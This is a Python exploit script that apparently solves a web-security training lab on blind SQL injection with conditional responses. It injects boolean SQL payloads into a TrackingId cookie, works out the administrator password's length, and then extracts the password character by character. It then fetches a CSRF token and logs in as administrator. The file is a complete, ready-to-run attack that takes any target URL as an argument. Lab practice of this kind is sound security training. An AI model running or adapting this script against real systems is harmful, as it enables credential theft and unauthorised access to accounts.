# Blind SQL injection with conditional responses

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def send_payload(s, url, tracking_cookie, payload):
	cookies = {"TrackingId": tracking_cookie + payload}
	r = s.get(url, cookies=cookies)
	time.sleep(.3)
	print('[+] Using payload:\t%s' % payload)
	return r

def get_password_length(s, url, tracking_cookie):
	for i in range(1, 30):
		length_payload = "' and (select username from users where username='administrator' and LENGTH(password)>%s)='administrator'--" % i
		r = send_payload(s, url, tracking_cookie, length_payload)
		if not 'Welcome back!' in r.text:
			return i
	return False

def get_admin_password(s, url, tracking_cookie, pass_len):
	admin_password = ""
	for i in range(1, pass_len + 1):
		for j in range(32, 126):
			password_payload = "' and (select ascii(substring(password, %s, 1)) from users where username='administrator')='%s'--" % (i, j)
			if i == 1 and j == 32:
				r = send_payload(s, url, tracking_cookie, password_payload)
				print('\n')
			else:
				cookies = {"TrackingId": tracking_cookie + password_payload}
				r = s.get(url, cookies=cookies)
			if not 'Welcome back!' in r.text:
				sys.stdout.write("\rAdmin's password:\t" + '*' * len(admin_password) + chr(j))
				sys.stdout.flush()
			else:
				admin_password += chr(j)
				sys.stdout.write("\rAdmin's password:\t" + '*' * len(admin_password))
				sys.stdout.flush()
				break
	return admin_password

def admin_login(s, url, password):
	print('\n[+] Trying to login as Administrator with found credentials...\n')
	login_path = url + '/login'
	r = s.get(login_path)
	csrf_token = get_csrf_token(r)
	username = "administrator"
	login_data = {"username": username, "password": password, "csrf": csrf_token}
	r = s.post(login_path, data=login_data)
	time.sleep(1)
	res = r.text
	if 'Your username is: administrator' in res:
		return r.text
	else:
		return False

def show_usage():
	print('[+] Usage: %s <URL> <PAYLOAD>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com "\' UNION SELECT NULL, NULL"' % sys.argv[0])
	print('[+] Example: %s https://www.target.com SOLUTION\t\t(solve the lab)' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Blind SQL injection with conditional responses')
	try:
		url = sys.argv[1].strip()
		payload = sys.argv[2].strip()
	except IndexError:
		show_usage()
	parsed_url = urllib.parse.urlparse(url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	r = s.get(url, allow_redirects=False)
	time.sleep(1)
	if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
		print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
		sys.exit(-1)
	tracking_cookie = s.cookies.get_dict().get('TrackingId')
	if payload != "SOLUTION":
		r = send_payload(s, url, tracking_cookie, payload)
		if not 'Welcome back!' in r.text:
			print('[-] Server Respond with an ERROR')
			exit(-1)
		else:
			num = r.text.find('Welcome back!')
			res = r.text[num:].split('\n')[0]
			print(res)
	else:
		print("\n[+] Determining the length of administrator's password...")
		pass_len = get_password_length(s, url, tracking_cookie)
		if pass_len:
			print("\n[+] Administrator's password is %s characters long !" % pass_len)
			print("[+] Trying to retrieve administrator's password...\n")
			admin_password = get_admin_password(s, url, tracking_cookie, pass_len)
			if admin_password:
				print("\n\n[+] Found administrator's password:\t%s" % admin_password)
				logged_in = admin_login(s, url, admin_password)
				if logged_in:
					print("\n[+] Successfully logged in with administrator's password...\n")
				else:
					print('\n[-] Exploit Failed to log in as Administrator <!>')
			else:
				print('\n[-] Exploit Failed to retrieve the password <!>')
		else:	
			print('\n[-] Exploit Failed to retrieve the password length <!>')

if __name__ == "__main__":
	main()
